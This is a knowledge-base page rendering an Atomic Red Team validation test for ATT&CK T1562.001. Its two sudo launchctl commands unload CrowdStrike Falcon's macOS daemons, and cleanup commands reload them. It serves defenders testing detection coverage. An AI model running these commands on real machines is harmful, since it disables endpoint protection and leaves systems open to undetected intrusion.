---
atomic_guid: "b3e7510c-2d4c-4249-a33f-591a2bc83eef"
title: "Stop and unload Crowdstrike Falcon on macOS"
framework: "atomic"
generated: "true"
attack_technique_id: "T1562.001"
attack_technique_name: "Impair Defenses: Disable or Modify Tools"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1562.001/T1562.001.yaml"
build_date: "2026-04-27 19:12:28"
executor: "sh"
aliases:
  - "b3e7510c-2d4c-4249-a33f-591a2bc83eef"
  - "Stop and unload Crowdstrike Falcon on macOS"
platforms:
  - "macos"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

Stop and unload Crowdstrike Falcon daemons falcond and userdaemon on macOS

## ATT&CK Mapping

- [[kb/attack/techniques/T1562-impair_defenses#^t1562001-disable-or-modify-tools|T1562.001: Disable or Modify Tools]]

## Input Arguments

### falcond_plist

- description: The path of the Crowdstrike Falcon plist file
- type: path
- default: /Library/LaunchDaemons/com.crowdstrike.falcond.plist

### userdaemon_plist

- description: The path of the Crowdstrike Userdaemon plist file
- type: path
- default: /Library/LaunchDaemons/com.crowdstrike.userdaemon.plist

## Executor

- elevation_required: True
- name: sh

### Command

```bash
sudo launchctl unload #{falcond_plist}
sudo launchctl unload #{userdaemon_plist}
```

### Cleanup

```bash
sudo launchctl load -w #{falcond_plist}
sudo launchctl load -w #{userdaemon_plist}
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1562.001/T1562.001.yaml)
